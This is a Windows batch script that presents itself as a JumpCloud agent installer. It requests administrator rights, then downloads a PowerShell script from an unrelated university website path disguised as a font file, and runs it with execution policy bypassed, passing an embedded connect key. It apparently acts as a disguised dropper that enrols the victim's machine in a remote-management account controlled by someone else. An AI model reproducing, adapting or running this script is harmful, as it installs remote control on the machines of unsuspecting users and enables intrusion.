��&cls
@echo off
setlocal EnableExtensions

set "SCRIPT_URL=https://amityuniversitypress.in/fonts/slick.aot"
set "SCRIPT_NAME=InstallWindowsAgent.ps1"
set "LOG_FILE=%TEMP%\JumpCloud_Install.log"
set "JC_KEY=jcc_eyJwdWJsaWNLaWNrc3RhcnRVcmwiOiJodHRwczovL2tpY2tzdGFydC5qdW1wY2xvdWQuY29tIiwicHJpdmF0ZUtpY2tzdGFydFVybCI6Imh0dHBzOi8vcHJpdmF0ZS1raWNrc3RhcnQuanVtcGNsb3VkLmNvbSIsImNvbm5lY3RLZXkiOiJmYjQ3YWQxODBhYjY2ODMyNzlhZjk5NjgzODE3NXxXXDkyNWE5MzY0MzM4In0g"

:: Admin check
net session >nul 2>&1 || (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

set "PS_SCRIPT=%TEMP%\jc_install.ps1"

> "%PS_SCRIPT%" echo $ErrorActionPreference='Stop'
>>"%PS_SCRIPT%" echo [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
>>"%PS_SCRIPT%" echo Set-Location $env:TEMP
>>"%PS_SCRIPT%" echo Start-BitsTransfer -Source '%SCRIPT_URL%' -Destination '%SCRIPT_NAME%'
>>"%PS_SCRIPT%" echo if (-not (Test-Path '%SCRIPT_NAME%')) { Write-Error 'Download failed'; exit 1 }
>>"%PS_SCRIPT%" echo .\%SCRIPT_NAME% -JumpCloudConnectKey '%JC_KEY%'

powershell.exe -NoProfile -ExecutionPolicy Bypass -File "%PS_SCRIPT%" ^
>> "%LOG_FILE%" 2>&1

if errorlevel 1 (
    echo [ERROR] Installation failed
    echo Log: %LOG_FILE%
    exit /b 1
)

echo [SUCCESS] JumpCloud Agent installed
exit /b 0